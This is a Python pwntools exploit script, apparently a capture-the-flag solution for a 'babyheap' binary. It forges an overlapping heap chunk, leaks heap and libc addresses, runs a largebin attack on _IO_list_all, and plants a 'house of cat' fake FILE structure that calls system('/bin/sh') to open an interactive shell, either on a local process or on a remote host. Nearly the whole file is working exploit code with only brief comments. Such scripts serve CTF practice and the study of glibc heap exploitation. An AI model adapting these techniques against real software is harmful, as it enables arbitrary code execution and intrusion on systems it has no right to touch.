from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 1
gdb_is = 0
elf_path = "./babyheap"
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        r = gdb.debug(elf_path,'set debug-file-directory ./.debug/')
        # gdb.attach(r,'b* 0x4012ed')
        # gdb.attach(r)
        # pause()
        pass
    else:
        r = process(elf_path)
    
else:
    host = "192.168.0.111:53783"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0



def show_addr(name,addr):
      success(f'{name} = {hex(addr)}')

def revc_addr(name:str, until:bytes =b'\x7f',offset:int = 0,addrType:str = 'bytes')->int:
    if type(until) == str:
        until = until.encode()
    if addrType == 'bytes':
        if not offset:
            addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
        else:
            addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    elif addrType == 'str':
        addr = int(r.recvuntil(until)[2:offset].decode(),16)

    show_addr(name,addr)
    return addr

def menu(choice):
    r.sendafter(b'>> \n',str(choice).encode())

def add(size,name = b'\n'): #size > 0x3FF && size <= 0x500
    menu(1)
    r.sendafter(b'input your name size\n',str(size).encode())
    r.sendafter(b'input your name\n',name)
def edit(index,size,name):
    menu(2)
    r.sendafter(b'input index\n',str(index).encode())
    r.sendafter(b'input your name size\n',str(size).encode())
    r.sendlineafter(b'input your name\n',name)
def show(index):
    menu(3)
    r.sendafter(b'input index\n',str(index).encode())
def delete(index):
    menu(4)
    r.sendafter(b'input index\n',str(index).encode())

libc = ELF('./libc.so.6')
elf = ELF(elf_path)
rop = ROP(elf)
r.recvuntil(b'make the game easier\n')
heap_base = revc_addr('heap_leak',until='\n',offset=-1,addrType='str') - 0x2a0
show_addr('heap',heap_base)



for i in range(4):
    add(0x428) #0123
add(0x4f8) #4
add(0x408) #5
edit(3,0x428,b"a"*0x420+p64(0x10b0)) #pre size = 10b0 把前面for的4个chunk都给吃掉

edit(0,0x428,flat([
    0,0x10b1,
    heap_base+0x2c0,heap_base+0x2c0, #指向自己的ptr
    heap_base+0x2c0,heap_base+0x2c0]))

delete(4) #合并了再fake chunk到 chunk4的所有chunk (free合并fake的时候chunk大小少了0x10）
add(0x418) # 4 <-> 0.1
for i in range(3):
    add(0x428) #5 -> 1 6 ->2  7 -> 3
add(0x4f8) #8 -> 4
delete(3) # 0x428 #10
add(0x438) #进largebin
show(8) #show 4 

libc.address = revc_addr('leaklibc') - 0x1ff0f0
show_addr('libc.address',libc.address)
#3堆块已经在largebin里了 

#largebin attack
edit(8,0x20,flat([0,0,0,libc.sym["_IO_list_all"]-0x20]))
delete(4)
add(0x458)

#house of cat
fakeio_addr = heap_base + 0x2c0
fakeio = FileStructure()
fakeio.flags = b'/bin/sh\x00'
fakeio._IO_write_ptr = 1
fakeio._IO_backup_base = 0x100
fakeio._lock = fakeio_addr+0x200
fakeio._wide_data = fakeio_addr+0x30
fakeio.vtable = libc.sym['_IO_wfile_jumps'] + 0x30
fakeio = bytes(fakeio)
shell =p64(fakeio_addr+0x30+0xe0+0x40).rjust(0x38,b'\x00')                         
shell+=p64(libc.sym['system']).rjust(0x58,b'\x00')
edit(0,len(fakeio) + len(shell),fakeio + shell)
menu(5)

r.interactive()